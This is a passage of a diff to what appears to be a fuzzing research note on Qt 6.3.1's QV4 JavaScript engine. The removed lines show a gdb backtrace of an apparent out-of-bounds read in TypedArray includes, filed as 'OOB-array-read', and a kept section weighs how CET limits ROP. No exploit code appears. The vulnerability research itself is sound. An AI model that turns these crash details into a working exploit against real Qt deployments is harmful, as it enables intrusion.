-#0  0x00007ffff7cd47eb in QV4::TypedArray::virtualGet(QV4::Managed const*, QV4::PropertyKey, QV4::Value const*, bool*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#1  0x00007ffff7cd80bd in QV4::IntrinsicTypedArrayPrototype::method_includes(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#2  0x00007ffff7cc0c48 in QV4::Runtime::CallProperty::call(QV4::ExecutionEngine*, QV4::Value const&, int, QV4::Value*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#3  0x00007ffff7cf11e2 in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#4  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#5  0x00007ffff7c56ef0 in QV4::ArrowFunction::virtualCall(QV4::FunctionObject const*, QV4::Value const*, QV4::Value const*, int) ()
-   from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#6  0x00007ffff7cbc60d in QV4::Runtime::CallName::call(QV4::ExecutionEngine*, int, QV4::Value*, int) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#7  0x00007ffff7cf116e in QV4::Moth::VME::interpret(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*, char const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#8  0x00007ffff7cf708f in QV4::Moth::VME::exec(QV4::JSTypesStackFrame*, QV4::ExecutionEngine*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#9  0x00007ffff7c554fa in QV4::Function::call(QV4::Value const*, QV4::Value const*, int, QV4::ExecutionContext*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#10 0x00007ffff7cc4fbc in QV4::Script::run(QV4::Value const*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#11 0x00007ffff7bef9d4 in QJSEngine::evaluate(QString const&, QString const&, int, QList<QString>*) () from /home/kali/Summer22/qjs-eval/target/qt-everywhere-src-6.3.1/qtbase/lib/libQt6Qml.so.6
-#12 0x0000555555556491 in main (argc=<optimized out>, argc@entry=0x2, argv=argv@entry=0x7fffffffdf18) at harness.cpp:61
-#13 0x00007ffff709b7fd in __libc_start_main (main=0x555555556300 <main(int, char**)>, argc=0x2, argv=0x7fffffffdf18, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf08)
-    at ../csu/libc-start.c:332
-#14 0x00005555555566ca in _start () at ../../../target/qt-everywhere-src-6.3.1/qtbase/include/QtCore/../../src/corelib/tools/qlist.h:418
-````
-
-*Similar Crashes Folder*:
-`results/crashes/reviewed/OOB-array-read`
-
-
-
-## Interesting Finds
-
+**References**
 ### CET
 
 It looks like CET is enabled in the [library](https://stackoverflow.com/questions/56905811/what-does-the-endbr64-instruction-actually-do) which would greatly restrict our ability to do ROP.
